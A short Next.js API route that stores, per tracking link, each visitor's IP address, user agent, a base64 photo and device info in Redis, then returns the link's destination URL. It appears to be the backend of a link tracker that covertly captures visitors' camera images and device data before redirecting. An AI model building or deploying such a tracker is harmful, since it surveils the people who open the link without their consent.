import { db } from '@/lib/redis';
import { NextResponse } from 'next/server';

export async function POST(req) {
  const { id, photo, deviceInfo } = await req.json();
  if (!id) return NextResponse.json({ error: 'Missing id' }, { status: 400 });
  const link = await db.hgetall(`link:${id}`);
  if (!link) return NextResponse.json({ error: 'Link not found' }, { status: 404 });
  const result = {
    ip: req.headers.get('x-forwarded-for') || req.ip,
    userAgent: req.headers.get('user-agent'),
    photo: photo || null,  // base64 string length manage karna, KV me badi values allow hai, Upstash me bhi ok
    deviceInfo,
    timestamp: new Date().toISOString(),
  };
  let results = [];
  try {
    results = JSON.parse(link.results || '[]');
  } catch {}
  results.push(result);
  await db.hset(`link:${id}`, { results: JSON.stringify(results) });
  return NextResponse.json({ success: true, destUrl: link.destUrl });
}
